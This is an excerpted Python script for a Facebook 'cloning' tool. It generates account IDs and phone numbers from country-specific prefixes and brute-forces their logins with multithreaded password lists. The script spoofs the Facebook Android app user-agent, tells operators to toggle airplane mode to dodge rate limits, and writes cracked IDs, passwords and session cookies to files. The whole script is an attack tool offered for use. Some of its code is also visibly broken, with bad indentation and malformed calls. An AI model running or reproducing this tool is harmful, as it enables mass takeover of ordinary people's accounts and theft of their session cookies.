...
def alex(uid):
    if len(uid)==15:
        if str(uid)[:10] in ['1000000000']       :alif = '2009'
        elif str(uid)[:9] in ['100000000']       :alif = '2009'
        elif str(uid)[:8] in ['10000000']        :alif = '2009'
        elif str(uid)[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:alif = '2009'
        elif str(uid)[:7] in ['1000006','1000007','1000008','1000009']:alif = '2010'
        elif str(uid)[:6] in ['100001']          :alif = '2010-2011'
        elif str(uid)[:6] in ['100002','100003'] :alif = '2011-2012'
        elif str(uid)[:6] in ['100004']          :alif = '2012-2013'
        elif str(uid)[:6] in ['100005','100006'] :alif = '2013-2014'
        elif str(uid)[:6] in ['100007','100008'] :alif = '2014-2015'
        elif str(uid)[:6] in ['100009']          :alif = '2015'
        elif str(uid)[:5] in ['10001']           :alif = '2015-2016'
        elif str(uid)[:5] in ['10002']           :alif = '2016-2017'
        elif str(uid)[:5] in ['10003']           :alif = '2018-2019'
        elif str(uid)[:5] in ['10004']           :alif = '2019-2020'
        elif str(uid)[:5] in ['10005']           :alif = '2020'
        elif str(uid)[:5] in ['10006','10007','']:alif = '2021'
        elif str(uid)[:5] in ['10008']           :alif = '2022'
        elif str(uid)[:5] in ['10009']           :alif = '2023'
        elif str(uid)[:5] in ['61551']           :alif = '2023'
        elif str(uid)[:4] in ['6155']           	:alif = '2023'
        elif str(uid)[:3] in ['615']           	:alif = '2023'
        elif str(uid)[:2] in ['61']           	:alif = '2023'
        else:alif=''
...
GithubUsername = 'ALEX1107'
GithubPassword = 'AXLRPW'
key = 'true'

while key == 'true':
    print(f'\n\n\033[1;32m Welcome to AXL-RPW Tool!\n\n')
    username = input('\033[1;97mTOOL USERNAME: \033[1;96m \x1b[1;96m')
    password = input('\033[1;97mTOOL PASSWORD: \033[1;96m \x1b[1;96m')

    if username == GithubUsername and password == GithubPassword:
    	print()
        print(f'\033[1;32m Access Granted! Welcome to AXL-RPW Tool.')
        time.sleep(1)
        os.system('clear')  # Clear the terminal screen
        key = 'false'
    else:
        print('\033[1;91mLogin failed. Please try again.')
...
\33[1;32m-------------------------------------------------------- 
  ...
  Tool Type  :  ROLEPLAYER'S FACEBOOK CLONING
  Version    :  2.1
\33[1;32m--------------------------------------------------------"""
def linex():
        print('\033[93;1m════════════════════════════════════════════════════════')         
...
def public():
        ...
        for met in range(jum):
                ...
                usrr.append(kl)
        linex()
        print(' Try method 1 & 2 for best results  ')
        linex()
        ...
        try:
                ...
                with tred(max_workers=30) as crack_submit:
                        ...
                        print("\033[1;37m \x1b[38;5;208m[•] If no result, switch to airplane mode\033[1;37m")
                        linex()
                        for user in id:
...
def menu():
                        ...
                        if xd in ['1','01']:
                                ...
                                linex()
                                plist = []
                                print(' Select Password Crack Menu');linex();print(' [1] Crack with tool automatic password \n [2] Crack with password choice \n [3] Working passwords for cloning ');linex()
                                ppp=input(' Choose: ')
                                if ppp in ['1','01']:
                                        ...
                                        plist.append('god123')
                                        plist.append('god143')
                                        plist.append('firstdump')
                                        plist.append('lastdump')
                                        plist.append('first')
                                        ...
                                        plist.append('firslastdump')
                                        plist.append('first@123')
                                        plist.append('first_123')
                                        plist.append('password')
                                        plist.append('123456')
                                        plist.append('pogiko')
                                        plist.append('gandako')
                                        plist.append('mamamoblue')
                                        plist.append('hulaanmo')
                                elif ppp in ['3','03']:
                                        clear()
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print(' [•] Total account : \033[1;32m'+total_ids+f' \033[1;33m>\033[1;36m> \033[1;37mMethod -> \033[1;37mM{mthd}')
                                        print("\033[1;37m \x1b[38;5; \033[92;1m[•] If no result, switch to airplane mode\033[1;37m")
                                        linex()
                                        for user in fo:
                                        	try:
                                                ids,names = user.split('|')
                                                except ValueError:
                                                	print(f"Error splitting user data: {user}")
        continue
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(ffb,ids,names,passlist)                                               
                                ...
                                print(' [1] Pakistan cloning\n [2] Bangladesh cloning\n [3] Gmail cloning\n [4] Indonesia cloning\n [5] Philippines cloning\n [6] Nigeria cloning\n [7] Malaysia cloning\n [8] indian cloning\n [0] Back menu')
                                linex()
                                x=input(' Choose: ')
                                if x in ['1','01']:
                                        pak()('espeak -a 300 "random cloning starte"')
                                elif x in ['2','02']:
                                        bd()('espeak -a 300 "random cloning starte"')
                                elif x in ['3','03']:
                                        gmail()('espeak -a 300 "random gmail starte"')
                                elif x in ['4','4']:
                                    Indonesia()
                                elif x in ['5','5']:
                                	Philippines()
                                   ...
                                   Malaysia()
                                    ...
                                    indian()('espeak -a 300 "random cloning starte"')
                                else:
                                        menu()
                        elif xd in ['5','05']:
                                gmail()
...
def pak():
                user=[]
                clear()
                print('\033[92;1mCode example: 0306,0315,0335,0345')
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;\033[92;1m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                ...
                with tred(max_workers=30) as Aking:     
                        ...
                        print(f'\033[1;37m \x1b[38;5;\033[92;1m[•] If no result, switch to airplane mode\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122','khan12345','khan123','khan123456','khankhan123','kingkhan','786786','alikhan','khan786','pak123','pak786']
...
def bd():
                user=[]
                clear()
                print(' \033[92;1mCode example: 016,017,018,019... etc')
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1; \033[92;1m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                ...
                with tred(max_workers=30) as Aking:     
                        ...
                        print(' [•] Total account : \033[1;32m'+tl)
                        print(f'\033[1;37m Choice code ..:\033[1;32m '+code)
                        print(f'\033[1;37m \x1b[38;5;208m[•] If no result, switch to airplane mode\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'Bangladesh','bangla786','i love you','iloveyou','free fire','freefire','102030','203040','506070','708090']
                                Aking.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
...
def Indonesia():
                user=[]
                clear()
                print('\033[92;1mIndonesia Code example: 62838,617,628,627,624')
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;\033[92;1m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                ...
                with tred(max_workers=30) as Aking:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'first8','last8','first6','last6','first7','last7','405060','708090','10002000']
                                Aking.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
...
def Philippines():
                user=[]
                clear()
                print('\033[92;1mPhilippines Code example: 63977,63966,63970,63980,639771')
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;\033[92;1m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                ...
                with tred(max_workers=30) as Aking:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'first8','last8','first6','last6','0123456789','first7','last7','708090','10002000']
                                Aking.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
...
def Nigeria():
                user=[]
                clear()
                print('\033[92;1mNigeria Code example: 234816,234817,234815')
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;\033[92;1m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                ...
                with tred(max_workers=30) as Aking:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'first8','last8','first7','last7','first6','last6','Nigeria','nigeria123','123456','nigeria12345','nigeria@123']
                                Aking.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
...
def Malaysia():
                user=[]
                clear()
                print('\033[92;1mMalaysia Code example: +6011,031,032,033,034')
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;\033[92;1m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                ...
                with tred(max_workers=30) as Aking:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'first8','last8','first6','last6','first7','last7','sayang','first9','10002000']
                                Aking.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
...
def indian():
                user=[]
                clear()
                print('\033[92;1mIndian Code example: 91629,91909,91882,91735,91708')
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;\033[92;1m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                ...
                with tred(max_workers=30) as Aking:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'first8','last8','first6','last6','57273200','102030','405060','708090','10002000']
                                Aking.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m[ALEX-COUNTING]  %s|OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        #ua = '[FBAN/FB4A;FBAV/'+fbap+';FBBV/'+fbbv+';FBDM/{density=1.52,width=335,height=696};FBLC/de_DE;FBRV/'+fbrv+';FBCR/Zong/Telenor;FBMF/Huawei;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/Device-7371;FBSV/'+fbsv+';FBOP/19;FBCA/x86;]'
                        ua = '[FBAN/FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.3,width=1080,height=1454};FBLC/en_US;FBRV/'+fbrv+';FBCR/TNT;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 5;FBSV/'+fbsv+';FBOP/1;FBCA/arm64-v8a:;]'                    
                        ...
                        if "c_user" in VEER:
                                ...
                                print(f'\r\r\x1b[1;92m[ALEX-ALIVE] %s | %s'%(ids,pas))
                                ...
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;93m[CHECKPOINT]  '+ids+' | '+pas+' | ['+alex(uid)+']\033[1;97m')
...
def rndm(ids,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        ua = '[FBAN/FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=1.29,width=1989,height=1023};FBLC/en_US;FBRV/'+fbrv+';FBCR/Zong/Telenor;FBMF/Huawei;FBBD/Google;FBPN/com.facebook.katana;FBDV/Device-2707;FBSV/'+fbsv+';FBOP/19;FBCA/x86;]'                        
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [ALEX-ALIVE] '+str(uid)+' | '+pas+' | ['+alex(uid)+']\033[1;97m')
                                        if "c" in user_opt:print(" \033[1;37m[Cookie] : \x1b[38;5;205m",coki)  
                                        open('/sdcard/Alex-R-COKI-OK.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/Alex-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')                                        
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        #print('\r\r\x1b[38;5;208m [CHECKPOINT] '+str(uid)+' | '+pas+' | ['+alex(uid)+']\033[1;97m')
                                        #open('/sdcard/Alex-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def Subscription():
	...
	clear()
	print(logo)
	r1=requests.get("https://github.com/AlexGrayson-RPW/alex-approval/blob/main/approvalSheet.txt").text
	if key1 in r1:
		os.system('clear')
		print(logo)
		menu()
